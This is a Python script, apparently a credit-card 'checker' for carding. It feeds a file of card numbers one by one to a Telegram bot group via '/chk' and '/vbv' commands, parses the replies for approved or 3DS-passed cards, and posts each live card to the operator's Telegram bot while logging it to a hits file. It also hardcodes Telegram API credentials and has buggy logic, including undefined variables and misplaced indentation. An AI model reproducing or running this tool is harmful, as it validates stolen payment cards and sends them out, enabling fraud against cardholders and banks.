import os
try :
    import pyfiglet
    import telethon
    import requests
    import datetime
    import pytz
    import webbrowser    
    import time
    import random
except:
    os.system('pip3 install pyfiglet')
    os.system('pip3 install telethon')
    os.system('pip3 install requests')
    os.system('pip3 install datetime')
    os.system('pip3 install pytz') 
    os.system('pip3 install webbrowser')
    os.system('random')   
    os.system('time')
import os
from telethon import TelegramClient
from telethon import TelegramClient, events, sync
from telethon.tl.functions.messages import GetHistoryRequest, GetBotCallbackAnswerRequest
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'

import requests,sys,os,time

import os
try:
 from cfonts import render, say
except:
 os.system('pip install python-cfonts')


output = render(' ', colors=['red', 'blue'], align='center')
print(output)
print("\033[1;32m\n")
print("\n\033[1;33m\n")
k=("----♡----♡-----♡------♡-----♡----♡----♡-----♡------♡-----♡")

print("CHOOSE ")
print(F+"1. chk")


choice = input(Z+"ENTER NUMBER")
if choice == '1':

 api_id = "21081500"
 api_hash = "e320c9fa51477b21b272d78f1ea85a9d"
 ch = input(B+"ENTER GROUP : "+Z)
 ID = input(X+"ENTER ID : "+Z)
 token= input(C+"ENTER TOKEN : "+F)
 combo = input(F+'ENTER COMBO : '+B)
 os.system('clear')
 client = TelegramClient('JOKER', api_id, api_hash)
 client.start()
 for cc in open(combo,"r").read().split("\n"): 
     try:
         client.send_message(ch ,f"/chk {cc}")
         time.sleep(random.randint(35,40))
         mssag = client.get_messages(ch, limit=1)
         if "ANTI_SPAM" in str(mssag[0].message):
             r = str(mssag[0].message).split("again after ")[1]
             r = t.split("seconds")[0]
             r = int(t)
             print(f"Done Sleep : {r+2}") 
             time.sleep(t+1)
         ccn = mssag[0].message
         cardd=ccn.split("𝗖𝗼𝘂𝗻𝘁𝗿𝘆:")[1]
         Cx=cardd.split("\n\n𝗧𝗼𝗼𝗸")[0]
         Ta=ccn.split("\n𝗧𝗼𝗼𝗸 ")[1]
         Tak=Ta.split(" 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")[0]
         binn=ccn.split('𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:')[1]
         bin=binn.split('\n𝗕𝗮𝗻𝗸:')[0]
         if '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅' in ccn :
             print(F+f'''◆ 𝑪𝑨𝑹𝑫  ➜ {cc} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {bin}
 ''')
             print(Z+k)
             mgs=f'''◆ 𝑪𝑨𝑹𝑫  ➜ {cc} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝑹𝑨𝑽𝑬𝑵
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {bin}
◆ 𝑻𝑶𝑶𝑲 ➜ {Tak}
━━━━━━━━━━━━━━━━━
@IY_PY '''
             tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={mgs}"
             i = requests.post(tlg)
             visacheck = open('JOKER_Hits.txt', 'a')
             visacheck.write(cc+"\n")
             visacheck.close
         else :
             print(Z+f'''◆ 𝑪𝑨𝑹𝑫  ➜ {cc} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 𝘿𝙀𝘼𝘿   ❌ 
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝘿𝙀𝘼𝘿 
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝑹𝑨𝑽𝑬𝑵
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {bin}
 ''')
             print(Z+k)
     except: 
         print(Z+f'''◆ 𝑪𝑨𝑹𝑫  ➜ {cc} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 𝘿𝙀𝘼𝘿   ❌ 
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝘿𝙀𝘼𝘿 
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝑹𝑨𝑽𝑬𝑵
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {bin}
 ''')
         print(Z+k)
 print(Z+'Ended check you combo ☑')
 
 exit()



if choice == '2':

 api_id = "21081500"
api_hash = "e320c9fa51477b21b272d78f1ea85a9d"
ch = input(B+"ENTER GROUP : "+Z)
ID = input(X+"ENTER ID : "+Z)
token= input(C+"ENTER TOKEN : "+F)
combo = input(F+'ENTER COMBO : '+B)
os.system('clear')
client = TelegramClient('JOKER', api_id, api_hash)
client.start()
for cc in open(combo,"r").read().split("\n"): 

    try:
        client.send_message(ch ,f"/vbv {cc}")
        time.sleep(random.randint(35,40))
        mssag = client.get_messages(ch, limit=1)
        if "ANTI_SPAM" in str(mssag[0].message):
            r = str(mssag[0].message).split("again after ")[1]
            r = t.split("seconds")[0]
            r = int(t)
            print(f"Done Sleep : {r+2}") 
            
            time.sleep(t+1)
        ccn = mssag[0].message
        cardd=ccn.split("𝗖𝗼𝘂𝗻𝘁𝗿𝘆:")[1]
        Cx=cardd.split("\n\n𝗧𝗼𝗼𝗸")[0]
        Ta=ccn.split("\n𝗧𝗼𝗼𝗸 ")[1]
        Tak=Ta.split(" 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")[0]
        binn=ccn.split('𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:')[1]
        bin=binn.split('\n𝗕𝗮𝗻𝗸:')[0]
        if '𝗣𝗮𝘀𝘀𝗲𝗱 ✅' in ccn or '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅' in ccn :
             print(F+f'''◆ 𝑪𝑨𝑹𝑫  ➜ {cc} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 3DS Lookup
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ Authenticate Attempt Successful
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {bin}
 ''')
             print(Z+k)
             mgs=f'''◆ 𝑪𝑨𝑹𝑫  ➜ {cc} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 3DS Lookup
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ Authenticate Attempt Successful
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝑹𝑨𝑽𝑬𝑵
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {bin}
◆ 𝑻𝑶𝑶𝑲 ➜ {Tak}
━━━━━━━━━━━━━━━━━
@IY_PY '''
             tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={mgs}"
             i = requests.post(tlg)
             visacheck = open('JOKER_Hits.txt', 'a')
             visacheck.write(cc+"\n")
             visacheck.close
        else :
             print(Z+f'''◆ 𝑪𝑨𝑹𝑫  ➜ {cc} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 𝘿𝙀𝘼𝘿   ❌ 
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝘿𝙀𝘼𝘿 
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝑹𝑨𝑽𝑬𝑵
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {bin}
 ''')
             print(Z+k)
    except: 
         print(Z+f'''◆ 𝑪𝑨𝑹𝑫  ➜ {cc} 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 𝘿𝙀𝘼𝘿   ❌ 
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝘿𝙀𝘼𝘿 
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ 𝑹𝑨𝑽𝑬𝑵
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {bin}
 ''')
         print(Z+k)
print(Z+'check combo ☑')
